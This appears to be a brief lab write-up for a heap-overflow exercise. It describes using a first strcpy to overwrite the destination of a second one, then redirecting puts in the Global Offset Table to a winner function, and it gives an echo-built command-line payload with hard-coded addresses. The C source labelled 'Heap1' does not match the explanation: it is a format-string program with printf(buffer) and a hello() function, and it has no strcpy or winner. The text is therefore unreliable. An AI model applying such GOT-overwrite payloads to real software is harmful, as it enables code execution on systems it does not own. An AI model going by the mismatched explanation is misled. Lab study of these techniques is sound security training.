First, we should know about heap in assembly.
And then, we know that there is a suspicious thing in strcopy,
strcopy(destination, whattocopy)
if we have doubke strcopy like :

strcopy(destination, whattocopy)
strcopy(destination, whattocopy)

we can use the first strcopy to set the destionation of the second strcopy.
This is the code that we use the first strcopy to overwrite the destination
of the second strcopy and set an address to the winner method to the whattocopy
of the second strcopy. We manipulate the program to execute the winner method by Overwriting the address
of puts method in the GOT (Global offset table) which is the address is [\x94\x84\x04\x08] the GOT address is [\x74\x97\x04\x08]:

"`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"


This is the code of Heap1 :
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
